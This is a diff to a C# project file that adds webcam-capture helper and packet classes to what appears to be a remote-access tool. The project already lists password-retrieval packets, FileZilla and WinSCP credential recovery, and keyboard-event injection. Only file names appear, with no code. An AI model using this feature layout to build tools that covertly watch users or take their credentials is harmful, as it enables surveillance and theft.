@@ -59,6 +59,7 @@
     <Compile Include="Core\Helper\NativeMethodsHelper.cs" />
     <Compile Include="Core\Helper\PlatformHelper.cs" />
     <Compile Include="Core\Helper\ScreenHelper.cs" />
+    <Compile Include="Core\Helper\WebcamHelper.cs" />
     <Compile Include="Core\NetSerializer\CodeGenContext.cs" />
     <Compile Include="Core\NetSerializer\Helpers.cs" />
     <Compile Include="Core\NetSerializer\ITypeSerializer.cs" />
@@ -81,9 +82,13 @@
     <Compile Include="Core\Encryption\AES.cs" />
     <Compile Include="Core\Encryption\SHA256.cs" />
     <Compile Include="Core\Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetWebcamImageResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\GetWebcamsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetPasswordsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\SetStatusFileManager.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoKeyboardEvent.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetWebcamImage.cs" />
+    <Compile Include="Core\Packets\ServerPackets\GetWebcams.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
     <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
     <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
